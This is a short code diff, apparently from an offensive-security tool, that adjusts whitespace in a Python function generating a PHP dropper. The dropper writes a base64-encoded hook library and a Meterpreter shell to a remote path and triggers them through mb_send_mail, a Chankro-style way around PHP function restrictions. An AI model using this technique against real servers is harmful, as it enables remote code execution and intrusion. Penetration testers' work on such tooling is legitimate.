@@ -93,8 +93,7 @@ def create_php_string(
     # https://github.com/TarlogicSecurity/Chankro/pull/10
     multibyte_send_mail = "{ mb_send_mail('a','a','a','a'); }"
 
-    return f"""
-<?php
+    return f"""<?php
 $hook = '{encoded_hook_file}';
 $meterpreter = '{encoded_shell}';
 file_put_contents('{validated_remote_path_file}', base64_decode($hook));
